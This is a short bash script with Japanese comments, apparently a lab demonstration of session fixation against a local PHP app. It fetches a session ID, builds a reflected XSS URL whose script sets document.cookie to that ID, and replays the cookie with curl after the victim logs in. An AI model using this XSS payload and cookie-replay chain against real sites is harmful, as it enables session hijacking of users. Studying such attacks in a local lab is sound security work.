#!/bin/bash

# curl でレスポンスヘッダーを取得
response=$(curl -s -I http://localhost/session.php?username=XYZ)

# レスポンスヘッダーから PHPSESSID の値を抽出
session_id=$(echo "$response" | grep -oP '(?<=PHPSESSID=)[^;]+')

# 抽出した PHPSESSID を用いて指定された2つの文字列を出力
echo "1. (browser) http://localhost/hello.php?username=%3Cscript%3Edocument.cookie%3D'PHPSESSID%3D$session_id'%3B%3C%2Fscript%3E"
echo "2. (browser) http://localhost/session.php?username=Yabuki"
echo "3. (shell) curl http://localhost/session.php -H 'Cookie: PHPSESSID=$session_id'"
